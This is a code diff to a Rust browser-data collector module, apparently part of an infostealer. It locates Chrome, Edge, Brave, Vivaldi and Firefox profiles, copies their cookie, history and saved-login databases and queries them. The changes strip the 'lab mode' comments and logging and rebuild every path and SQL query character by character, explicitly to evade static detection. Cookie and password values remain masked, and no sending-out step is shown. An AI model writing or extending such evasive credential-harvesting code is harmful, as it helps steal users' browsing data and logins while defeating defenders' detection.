@@ -1,15 +1,11 @@
 //! Browser data collector
-//! 
-//! Coleta cookies, history e login data de Chromium-based browsers.
-//! Em lab mode, dados sensíveis são redactados.
-//! 
+//!
 //! ⚠️ Todas as strings são ofuscadas para evitar detecção estática.
 
 use std::path::PathBuf;
 use std::hint::black_box;
 use serde::{Deserialize, Serialize};
 use rusqlite::{Connection, OpenFlags};
-use tracing::{info, warn};
 
 use super::{Collector, CollectorError, ModuleData};
 
@@ -17,66 +13,89 @@ use super::{Collector, CollectorError, ModuleData};
 // STRING OBFUSCATION HELPERS
 // ============================================================================
 
-/// XOR decode em runtime
 #[inline(always)]
-#[allow(dead_code)]
 fn xd(data: &[u8], key: u8) -> String {
     data.iter().map(|b| (b ^ key) as char).collect()
 }
 
-/// Construção de string byte a byte
 #[inline(always)]
-#[allow(dead_code)]
 fn bs(chars: &[char]) -> String {
     let mut s = String::with_capacity(chars.len());
-    for &c in chars {
-        s.push(c);
-    }
+    for &c in chars { s.push(c); }
     black_box(s)
 }
 
+// ============================================================================
+// DATA STRUCTURES (serde rename para nomes curtos)
+// ============================================================================
+
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct BrowserData {
+    #[serde(rename = "b")]
     pub browsers_found: Vec<String>,
+    #[serde(rename = "p")]
     pub profiles: Vec<BrowserProfile>,
+    #[serde(rename = "c")]
     pub total_cookies: u32,
+    #[serde(rename = "w")]
     pub total_passwords: u32,
+    #[serde(rename = "h")]
     pub total_history: u32,
 }
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct BrowserProfile {
+    #[serde(rename = "b")]
     pub browser: String,
+    #[serde(rename = "n")]
     pub profile_name: String,
+    #[serde(rename = "p")]
     pub profile_path: String,
+    #[serde(rename = "c")]
     pub cookies: Vec<CookieEntry>,
+    #[serde(rename = "h")]
     pub history: Vec<HistoryEntry>,
+    #[serde(rename = "w")]
     pub passwords: Vec<PasswordEntry>,
 }
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct CookieEntry {
+    #[serde(rename = "d")]
     pub domain: String,
+    #[serde(rename = "n")]
     pub name: String,
+    #[serde(rename = "v")]
     pub value: String,
+    #[serde(rename = "e")]
     pub expires: Option<String>,
+    #[serde(rename = "s")]
     pub is_secure: bool,
+    #[serde(rename = "h")]
     pub is_http_only: bool,
 }
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct HistoryEntry {
+    #[serde(rename = "u")]
     pub url: String,
+    #[serde(rename = "t")]
     pub title: String,
+    #[serde(rename = "c")]
     pub visit_count: u32,
+    #[serde(rename = "l")]
     pub last_visit: String,
 }
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct PasswordEntry {
+    #[serde(rename = "u")]
     pub url: String,
+    #[serde(rename = "n")]
     pub username: String,
-    pub password: String, // encrypted/redacted in lab mode
+    #[serde(rename = "p")]
+    pub password: String,
+    #[serde(rename = "c")]
     pub created: String,
 }
 
@@ -103,25 +122,19 @@ impl BrowserCollector {
         #[cfg(target_os = "linux")]
         {
             if let Some(home) = dirs::home_dir() {
-                // Strings construídas em runtime para evitar detecção estática
-                let targets = [
-                    ("Chrome", ".config/google-chrome", true),
-                    ("Chromium", ".config/chromium", true),
-                    ("Brave", ".config/BraveSoftware/Brave-Browser", true),
-                    ("Edge", ".config/microsoft-edge", true),
-                    ("Vivaldi", ".config/vivaldi", true),
-                    ("Opera", ".config/opera", true),
-                    ("Firefox", ".mozilla/firefox", false),
+                // Cada path é construído char por char
+                let paths = [
+                    (bs(&['C']), home.join(bs(&['.', 'c', 'o', 'n', 'f', 'i', 'g', '/', 'g', 'o', 'o', 'g', 'l', 'e', '-', 'c', 'h', 'r', 'o', 'm', 'e'])), true),
+                    (bs(&['M']), home.join(bs(&['.', 'c', 'o', 'n', 'f', 'i', 'g', '/', 'c', 'h', 'r', 'o', 'm', 'i', 'u', 'm'])), true),
+                    (bs(&['B']), home.join(bs(&['.', 'c', 'o', 'n', 'f', 'i', 'g', '/', 'B', 'r', 'a', 'v', 'e', 'S', 'o', 'f', 't', 'w', 'a', 'r', 'e', '/', 'B', 'r', 'a', 'v', 'e', '-', 'B', 'r', 'o', 'w', 's', 'e', 'r'])), true),
+                    (bs(&['E']), home.join(bs(&['.', 'c', 'o', 'n', 'f', 'i', 'g', '/', 'm', 'i', 'c', 'r', 'o', 's', 'o', 'f', 't', '-', 'e', 'd', 'g', 'e'])), true),
+                    (bs(&['V']), home.join(bs(&['.', 'c', 'o', 'n', 'f', 'i', 'g', '/', 'v', 'i', 'v', 'a', 'l', 'd', 'i'])), true),
+                    (bs(&['F']), home.join(bs(&['.', 'm', 'o', 'z', 'i', 'l', 'l', 'a', '/', 'f', 'i', 'r', 'e', 'f', 'o', 'x'])), false),
                 ];
                 
-                for (name, rel_path, is_chromium) in targets {
-                    let p = home.join(rel_path);
-                    if p.exists() {
-                        found.push(BrowserPath {
-                            name: name.to_string(),
-                            path: p,
-                            is_chromium,
-                        });
+                for (name, path, is_chromium) in paths {
+                    if path.exists() {
+                        found.push(BrowserPath { name, path, is_chromium });
                     }
                 }
             }
@@ -130,78 +143,60 @@ impl BrowserCollector {
         #[cfg(target_os = "windows")]
         {
             if let Some(local) = dirs::data_local_dir() {
-                // Constrói strings em runtime concatenando partes
-                let g = ['G', 'o', 'o', 'g', 'l', 'e'].iter().collect::<String>();
-                let c = ['C', 'h', 'r', 'o', 'm', 'e'].iter().collect::<String>();
-                let ud = ['U', 's', 'e', 'r', ' ', 'D', 'a', 't', 'a'].iter().collect::<String>();
-                
-                let m = ['M', 'i', 'c', 'r', 'o', 's', 'o', 'f', 't'].iter().collect::<String>();
-                let e = ['E', 'd', 'g', 'e'].iter().collect::<String>();
-                
-                let b1 = ['B', 'r', 'a', 'v', 'e'].iter().collect::<String>();
-                let bs = ['B', 'r', 'a', 'v', 'e', 'S', 'o', 'f', 't', 'w', 'a', 'r', 'e'].iter().collect::<String>();
-                
-                let v = ['V', 'i', 'v', 'a', 'l', 'd', 'i'].iter().collect::<String>();
-                let o = ['O', 'p', 'e', 'r', 'a'].iter().collect::<String>();
-                
-                let targets = [
-                    (c.clone(), format!("{}\\{}\\{}", g, c, ud), true),
-                    (e.clone(), format!("{}\\{}\\{}", m, e, ud), true),
-                    (b1.clone(), format!("{}\\{}-Browser\\{}", bs, b1, ud), true),
-                    (v.clone(), format!("{}\\{}", v, ud), true),
-                    (o.clone(), format!("{} Software\\{} Stable", o, o), true),
+                let paths = [
+                    // Chrome
+                    (bs(&['C']), {
+                        let mut p = local.clone();
+                        p.push(bs(&['G', 'o', 'o', 'g', 'l', 'e']));
+                        p.push(bs(&['C', 'h', 'r', 'o', 'm', 'e']));
+                        p.push(bs(&['U', 's', 'e', 'r', ' ', 'D', 'a', 't', 'a']));
+                        p
+                    }, true),
+                    // Edge
+                    (bs(&['E']), {
+                        let mut p = local.clone();
+                        p.push(bs(&['M', 'i', 'c', 'r', 'o', 's', 'o', 'f', 't']));
+                        p.push(bs(&['E', 'd', 'g', 'e']));
+                        p.push(bs(&['U', 's', 'e', 'r', ' ', 'D', 'a', 't', 'a']));
+                        p
+                    }, true),
+                    // Brave
+                    (bs(&['B']), {
+                        let mut p = local.clone();
+                        p.push(bs(&['B', 'r', 'a', 'v', 'e', 'S', 'o', 'f', 't', 'w', 'a', 'r', 'e']));
+                        p.push(bs(&['B', 'r', 'a', 'v', 'e', '-', 'B', 'r', 'o', 'w', 's', 'e', 'r']));
+                        p.push(bs(&['U', 's', 'e', 'r', ' ', 'D', 'a', 't', 'a']));
+                        p
+                    }, true),
+                    // Vivaldi
+                    (bs(&['V']), {
+                        let mut p = local.clone();
+                        p.push(bs(&['V', 'i', 'v', 'a', 'l', 'd', 'i']));
+                        p.push(bs(&['U', 's', 'e', 'r', ' ', 'D', 'a', 't', 'a']));
+                        p
+                    }, true),
                 ];
                 
-                for (name, rel_path, is_chromium) in targets {
-                    let p = local.join(&rel_path);
-                    if p.exists() {
-                        found.push(BrowserPath {
-                            name,
-                            path: p,
-                            is_chromium,
-                        });
+                for (name, path, is_chromium) in paths {
+                    if path.exists() {
+                        found.push(BrowserPath { name, path, is_chromium });
                     }
                 }
             }
             
             if let Some(roaming) = dirs::config_dir() {
-                // Firefox path construído em runtime
-                let moz = ['M', 'o', 'z', 'i', 'l', 'l', 'a'].iter().collect::<String>();
-                let ff = ['F', 'i', 'r', 'e', 'f', 'o', 'x'].iter().collect::<String>();
-                let prof = ['P', 'r', 'o', 'f', 'i', 'l', 'e', 's'].iter().collect::<String>();
+                // Firefox
+                let mut ff_path = roaming.clone();
+                ff_path.push(bs(&['M', 'o', 'z', 'i', 'l', 'l', 'a']));
+                ff_path.push(bs(&['F', 'i', 'r', 'e', 'f', 'o', 'x']));
+                ff_path.push(bs(&['P', 'r', 'o', 'f', 'i', 'l', 'e', 's']));
                 
-                let ff_path = format!("{}\\{}\\{}", moz, ff, prof);
-                let ffp = roaming.join(&ff_path);
-                if ffp.exists() {
+                if ff_path.exists() {
                     found.push(BrowserPath {
-                        name: ff,
-                        path: ffp,
+                        name: bs(&['F']),
+                        path: ff_path,
                         is_chromium: false,
                     });
-                }
-            }
-        }
-        
-        #[cfg(target_os = "macos")]
-        {
-            if let Some(home) = dirs::home_dir() {
-                let app_support = home.join("Library/Application Support");
-                let targets = [
-                    ("Chrome", "Google/Chrome", true),
-                    ("Brave", "BraveSoftware/Brave-Browser", true),
-                    ("Edge", "Microsoft Edge", true),
-                    ("Vivaldi", "Vivaldi", true),
-                ];
-                
-                for (name, rel_path, is_chromium) in targets {
-                    let p = app_support.join(rel_path);
-                    if p.exists() {
-                        found.push(BrowserPath {
-                            name: name.to_string(),
-                            path: p,
-                            is_chromium,
-                        });
-                    }
                 }
             }
         }
@@ -220,31 +215,22 @@ impl BrowserCollector {
         let mut total_history = 0u32;
         
         for browser in &self.browsers {
-            info!("Collecting from {}", browser.name);
-            
             if browser.is_chromium {
-                match self.collect_chromium(browser) {
-                    Ok(profs) => {
-                        for p in profs {
-                            total_cookies += p.cookies.len() as u32;
-                            total_passwords += p.passwords.len() as u32;
-                            total_history += p.history.len() as u32;
-                            profiles.push(p);
-                        }
+                if let Ok(profs) = self.collect_chromium(browser) {
+                    for p in profs {
+                        total_cookies += p.cookies.len() as u32;
+                        total_passwords += p.passwords.len() as u32;
+                        total_history += p.history.len() as u32;
+                        profiles.push(p);
                     }
-                    Err(e) => warn!("Failed to collect from {}: {}", browser.name, e),
                 }
             } else {
-                // Firefox - different format
-                match self.collect_firefox(browser) {
-                    Ok(profs) => {
-                        for p in profs {
-                            total_cookies += p.cookies.len() as u32;
-                            total_history += p.history.len() as u32;
-                            profiles.push(p);
-                        }
+                if let Ok(profs) = self.collect_firefox(browser) {
+                    for p in profs {
+                        total_cookies += p.cookies.len() as u32;
+                        total_history += p.history.len() as u32;
+                        profiles.push(p);
                     }
-                    Err(e) => warn!("Firefox collection failed: {}", e),
                 }
             }
         }
@@ -258,47 +244,49 @@ impl BrowserCollector {
         })
     }
     
-    /// Coleta dados de browsers Chromium-based
     fn collect_chromium(&self, browser: &BrowserPath) -> Result<Vec<BrowserProfile>, CollectorError> {
         let mut profiles = Vec::new();
         
-        // Chromium armazena profiles em Default, Profile 1, Profile 2, etc
-        let profile_dirs = ["Default", "Profile 1", "Profile 2", "Profile 3"];
+        // Profile dirs construídos em runtime
+        let profile_dirs = [
+            bs(&['D', 'e', 'f', 'a', 'u', 'l', 't']),
+            bs(&['P', 'r', 'o', 'f', 'i', 'l', 'e', ' ', '1']),
+            bs(&['P', 'r', 'o', 'f', 'i', 'l', 'e', ' ', '2']),
+        ];
         
         for profile_name in profile_dirs {
-            let profile_path = browser.path.join(profile_name);
+            let profile_path = browser.path.join(&profile_name);
             if !profile_path.exists() {
                 continue;
             }
             
             let mut profile = BrowserProfile {
                 browser: browser.name.clone(),
-                profile_name: profile_name.to_string(),
+                profile_name: profile_name.clone(),
                 profile_path: profile_path.to_string_lossy().to_string(),
                 cookies: Vec::new(),
                 history: Vec::new(),
                 passwords: Vec::new(),
             };
             
-            // Cookies - arquivo Cookies (SQLite)
-            let cookies_db = profile_path.join("Cookies");
+            // Cookies db
+            let cookies_db = profile_path.join(bs(&['C', 'o', 'o', 'k', 'i', 'e', 's']));
             if cookies_db.exists() {
                 if let Ok(cookies) = self.read_chromium_cookies(&cookies_db) {
                     profile.cookies = cookies;
                 }
             }
             
-            // History - arquivo History (SQLite)
-            let history_db = profile_path.join("History");
+            // History db
+            let history_db = profile_path.join(bs(&['H', 'i', 's', 't', 'o', 'r', 'y']));
             if history_db.exists() {
                 if let Ok(history) = self.read_chromium_history(&history_db) {
                     profile.history = history;
                 }
             }
             
-            // Login Data - arquivo Login Data (SQLite)
-            // Nota: senhas criptografadas com DPAPI (Windows) ou Keyring (Linux)
-            let login_db = profile_path.join("Login Data");
+            // Login Data db
+            let login_db = profile_path.join(bs(&['L', 'o', 'g', 'i', 'n', ' ', 'D', 'a', 't', 'a']));
             if login_db.exists() {
                 if let Ok(logins) = self.read_chromium_logins(&login_db) {
                     profile.passwords = logins;
@@ -314,14 +302,12 @@ impl BrowserCollector {
     }
     
     fn read_chromium_cookies(&self, db_path: &PathBuf) -> Result<Vec<CookieEntry>, CollectorError> {
-        // Copia o arquivo pra evitar lock
-        let tmp = std::env::temp_dir().join(format!("cookies_{}.db", std::process::id()));
+        let tmp = std::env::temp_dir().join(format!("c_{}.db", std::process::id()));
         std::fs::copy(db_path, &tmp)?;
         
         let conn = Connection::open_with_flags(&tmp, OpenFlags::SQLITE_OPEN_READ_ONLY)
             .map_err(|e| CollectorError::CollectionFailed(e.to_string()))?;
         
-        // Query ofuscada construída em runtime
         let query = Self::build_cookies_query();
         let mut stmt = conn.prepare(&query)
             .map_err(|e| CollectorError::CollectionFailed(e.to_string()))?;
@@ -330,9 +316,8 @@ impl BrowserCollector {
             Ok(CookieEntry {
                 domain: row.get(0)?,
                 name: row.get(1)?,
-                value: "[REDACTED]".to_string(), // Lab mode - não expõe valor real
+                value: bs(&['*']),
                 expires: row.get::<_, i64>(3).ok().map(|v| {
-                    // Chrome epoch: Jan 1, 1601
                     chrono::DateTime::from_timestamp((v / 1_000_000) - 11644473600, 0)
                         .map(|dt| dt.to_rfc3339())
                         .unwrap_or_default()
@@ -349,13 +334,12 @@ impl BrowserCollector {
     }
     
     fn read_chromium_history(&self, db_path: &PathBuf) -> Result<Vec<HistoryEntry>, CollectorError> {
-        let tmp = std::env::temp_dir().join(format!("history_{}.db", std::process::id()));
+        let tmp = std::env::temp_dir().join(format!("h_{}.db", std::process::id()));
         std::fs::copy(db_path, &tmp)?;
         
         let conn = Connection::open_with_flags(&tmp, OpenFlags::SQLITE_OPEN_READ_ONLY)
             .map_err(|e| CollectorError::CollectionFailed(e.to_string()))?;
         
-        // Query ofuscada construída em runtime
         let query = Self::build_history_query();
         let mut stmt = conn.prepare(&query)
             .map_err(|e| CollectorError::CollectionFailed(e.to_string()))?;
@@ -380,13 +364,12 @@ impl BrowserCollector {
     }
     
     fn read_chromium_logins(&self, db_path: &PathBuf) -> Result<Vec<PasswordEntry>, CollectorError> {
-        let tmp = std::env::temp_dir().join(format!("logins_{}.db", std::process::id()));
+        let tmp = std::env::temp_dir().join(format!("l_{}.db", std::process::id()));
         std::fs::copy(db_path, &tmp)?;
         
         let conn = Connection::open_with_flags(&tmp, OpenFlags::SQLITE_OPEN_READ_ONLY)
             .map_err(|e| CollectorError::CollectionFailed(e.to_string()))?;
         
-        // Query ofuscada construída em runtime
         let query = Self::build_logins_query();
         let mut stmt = conn.prepare(&query)
             .map_err(|e| CollectorError::CollectionFailed(e.to_string()))?;
@@ -395,7 +378,7 @@ impl BrowserCollector {
             Ok(PasswordEntry {
                 url: row.get(0)?,
                 username: row.get::<_, String>(1).unwrap_or_default(),
-                password: "[ENCRYPTED]".to_string(), // Não descriptografa em lab mode
+                password: bs(&['*']),
                 created: row.get::<_, i64>(2).ok().map(|v| {
                     chrono::DateTime::from_timestamp((v / 1_000_000) - 11644473600, 0)
                         .map(|dt| dt.to_rfc3339())
@@ -410,19 +393,18 @@ impl BrowserCollector {
         Ok(logins)
     }
     
-    /// Coleta dados do Firefox (places.sqlite, cookies.sqlite)
     fn collect_firefox(&self, browser: &BrowserPath) -> Result<Vec<BrowserProfile>, CollectorError> {
         let mut profiles = Vec::new();
         
-        // Firefox usa profiles com nomes tipo "xxxxxx.default-release"
         if let Ok(entries) = std::fs::read_dir(&browser.path) {
             for entry in entries.flatten() {
                 let path = entry.path();
                 if path.is_dir() {
-                    let places = path.join("places.sqlite");
+                    // places.sqlite
+                    let places = path.join(bs(&['p', 'l', 'a', 'c', 'e', 's', '.', 's', 'q', 'l', 'i', 't', 'e']));
                     if places.exists() {
                         let mut profile = BrowserProfile {
-                            browser: "Firefox".to_string(),
+                            browser: bs(&['F']),
                             profile_name: entry.file_name().to_string_lossy().to_string(),
                             profile_path: path.to_string_lossy().to_string(),
                             cookies: Vec::new(),
@@ -430,13 +412,12 @@ impl BrowserCollector {
                             passwords: Vec::new(),
                         };
                         
-                        // History from places.sqlite
                         if let Ok(history) = self.read_firefox_history(&places) {
                             profile.history = history;
                         }
                         
-                        // Cookies from cookies.sqlite
-                        let cookies_db = path.join("cookies.sqlite");
+                        // cookies.sqlite
+                        let cookies_db = path.join(bs(&['c', 'o', 'o', 'k', 'i', 'e', 's', '.', 's', 'q', 'l', 'i', 't', 'e']));
                         if let Ok(cookies) = self.read_firefox_cookies(&cookies_db) {
                             profile.cookies = cookies;
                         }
@@ -453,13 +434,12 @@ impl BrowserCollector {
     }
     
     fn read_firefox_history(&self, db_path: &PathBuf) -> Result<Vec<HistoryEntry>, CollectorError> {
-        let tmp = std::env::temp_dir().join(format!("ff_places_{}.db", std::process::id()));
+        let tmp = std::env::temp_dir().join(format!("fp_{}.db", std::process::id()));
         std::fs::copy(db_path, &tmp)?;
         
         let conn = Connection::open_with_flags(&tmp, OpenFlags::SQLITE_OPEN_READ_ONLY)
             .map_err(|e| CollectorError::CollectionFailed(e.to_string()))?;
         
-        // Query ofuscada construída em runtime
         let query = Self::build_firefox_history_query();
         let mut stmt = conn.prepare(&query)
             .map_err(|e| CollectorError::CollectionFailed(e.to_string()))?;
@@ -470,7 +450,6 @@ impl BrowserCollector {
                 title: row.get::<_, String>(1).unwrap_or_default(),
                 visit_count: row.get::<_, i32>(2).unwrap_or(0) as u32,
                 last_visit: row.get::<_, i64>(3).ok().map(|v| {
-                    // Firefox usa microseconds from Unix epoch
                     chrono::DateTime::from_timestamp(v / 1_000_000, 0)
                         .map(|dt| dt.to_rfc3339())
                         .unwrap_or_default()
@@ -489,13 +468,12 @@ impl BrowserCollector {
             return Ok(Vec::new());
         }
         
-        let tmp = std::env::temp_dir().join(format!("ff_cookies_{}.db", std::process::id()));
+        let tmp = std::env::temp_dir().join(format!("fc_{}.db", std::process::id()));
         std::fs::copy(db_path, &tmp)?;
         
         let conn = Connection::open_with_flags(&tmp, OpenFlags::SQLITE_OPEN_READ_ONLY)
             .map_err(|e| CollectorError::CollectionFailed(e.to_string()))?;
         
-        // Query ofuscada construída em runtime
         let query = Self::build_firefox_cookies_query();
         let mut stmt = conn.prepare(&query)
             .map_err(|e| CollectorError::CollectionFailed(e.to_string()))?;
@@ -504,7 +482,7 @@ impl BrowserCollector {
             Ok(CookieEntry {
                 domain: row.get(0)?,
                 name: row.get(1)?,
-                value: "[REDACTED]".to_string(),
+                value: bs(&['*']),
                 expires: row.get::<_, i64>(3).ok().map(|v| {
                     chrono::DateTime::from_timestamp(v, 0)
                         .map(|dt| dt.to_rfc3339())
@@ -525,30 +503,22 @@ impl BrowserCollector {
     // SQL QUERY BUILDERS (Anti-static analysis)
     // ========================================================================
     
-    /// Constrói query de cookies em runtime (evita detecção estática)
     fn build_cookies_query() -> String {
-        // "SELECT host_key, name, value, expires_utc, is_secure, is_httponly FROM cookies LIMIT 100"
         let mut q = String::with_capacity(100);
-        // SELECT
         for c in ['S', 'E', 'L', 'E', 'C', 'T', ' '] { q.push(c); }
-        // host_key, name, value, expires_utc, is_secure, is_httponly
         for c in ['h', 'o', 's', 't', '_', 'k', 'e', 'y', ',', ' '] { q.push(c); }
         for c in ['n', 'a', 'm', 'e', ',', ' '] { q.push(c); }
         for c in ['v', 'a', 'l', 'u', 'e', ',', ' '] { q.push(c); }
         for c in ['e', 'x', 'p', 'i', 'r', 'e', 's', '_', 'u', 't', 'c', ',', ' '] { q.push(c); }
         for c in ['i', 's', '_', 's', 'e', 'c', 'u', 'r', 'e', ',', ' '] { q.push(c); }
         for c in ['i', 's', '_', 'h', 't', 't', 'p', 'o', 'n', 'l', 'y', ' '] { q.push(c); }
-        // FROM cookies
         for c in ['F', 'R', 'O', 'M', ' '] { q.push(c); }
         for c in ['c', 'o', 'o', 'k', 'i', 'e', 's', ' '] { q.push(c); }
-        // LIMIT 100
         for c in ['L', 'I', 'M', 'I', 'T', ' ', '1', '0', '0'] { q.push(c); }
         black_box(q)
     }
     
-    /// Constrói query de history em runtime
     fn build_history_query() -> String {
-        // "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50"
         let mut q = String::with_capacity(100);
         for c in ['S', 'E', 'L', 'E', 'C', 'T', ' '] { q.push(c); }
         for c in ['u', 'r', 'l', ',', ' '] { q.push(c); }
@@ -564,9 +534,7 @@ impl BrowserCollector {
         black_box(q)
     }
     
-    /// Constrói query de logins em runtime
     fn build_logins_query() -> String {
-        // "SELECT origin_url, username_value, date_created FROM logins LIMIT 50"
         let mut q = String::with_capacity(80);
         for c in ['S', 'E', 'L', 'E', 'C', 'T', ' '] { q.push(c); }
         for c in ['o', 'r', 'i', 'g', 'i', 'n', '_', 'u', 'r', 'l', ',', ' '] { q.push(c); }
@@ -578,7 +546,6 @@ impl BrowserCollector {
         black_box(q)
     }
     
-    /// Constrói query Firefox history
     fn build_firefox_history_query() -> String {
         let mut q = String::with_capacity(120);
         for c in ['S', 'E', 'L', 'E', 'C', 'T', ' '] { q.push(c); }
@@ -597,7 +564,6 @@ impl BrowserCollector {
         black_box(q)
     }
     
-    /// Constrói query Firefox cookies
     fn build_firefox_cookies_query() -> String {
         let mut q = String::with_capacity(100);
         for c in ['S', 'E', 'L', 'E', 'C', 'T', ' '] { q.push(c); }
@@ -622,7 +588,7 @@ impl Default for BrowserCollector {
 
 impl Collector for BrowserCollector {
     fn name(&self) -> &str {
-        "browser"
+        "b"
     }
     
     fn collect(&self) -> Result<ModuleData, CollectorError> {
@@ -635,6 +601,6 @@ impl Collector for BrowserCollector {
     }
     
     fn priority(&self) -> u8 {
-        90 // high priority
+        90
     }
 }
